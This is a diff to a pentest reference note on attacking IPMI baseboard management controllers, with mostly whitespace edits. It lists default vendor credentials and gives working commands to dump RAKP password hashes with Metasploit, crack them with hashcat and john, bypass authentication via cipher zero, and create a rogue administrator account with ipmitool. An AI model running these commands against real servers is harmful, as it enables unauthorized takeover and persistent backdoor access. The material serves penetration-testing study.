@@ -2,6 +2,7 @@
 public: true 
 #Tags: tag1, tag2
 ---
+
 Port : 623/udp
 
 ## Enumeration
@@ -45,14 +46,16 @@ msf6 auxiliary(scanner/ipmi/ipmi_version) > run
 | HP iLO | Administrator | randomized 8 characters (number and uppercase letters) |
 | Supermicro IPMI | ADMIN | ADMIN |
 
-
 ## IPMI 2.0 Password Hash grabbing
+
 Any valid username can lead to grabbing from the server the salted SHA1 or MD5 password of that user. In the event of an HP iLO using a factory default password, we can use this Hashcat mask attack command `hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u` which tries all combinations of upper case letters and numbers for an eight-character password.
 
 It can then be cracked offline using `hashcat` with `mode 7300`
 
 ### Getting the Hash using Metasploit
+
 [IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/)
+
 ```shell-session
 msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
 msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
@@ -82,6 +85,7 @@ msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
 ```
 
 #### Cracking the hash
+
 ```
 $ john -w=/usr/share/wordlists/rockyou.txt ipmi.john 
 Using default input encoding: UTF-8
@@ -96,6 +100,7 @@ Session completed.
 ```
 
 ### Authenticating without password
+
 If you know a valid username, you might authenticate without password
 
 #### Check if host is vulnerable
@@ -131,9 +136,11 @@ ID  Name             Callin  Link Auth  IPMI Msg   Channel Priv Limit
 ```
 
 Creation of a new administrator user with known password
+
 ```
 $ ipmitool -I lanplus -H $TARGET_IP -C 0  -U ceil -P whateverpassword user set name 4 rebrec 
 $ ipmitool -I lanplus -H $TARGET_IP -C 0  -U ceil -P whateverpassword user set password 4 rebrec
 $ ipmitool -I lanplus -H $TARGET_IP -C 0  -U ceil -P whateverpassword user set priv 4 4
 ```
+
 We can then try to connect through the web interface and interact with the console
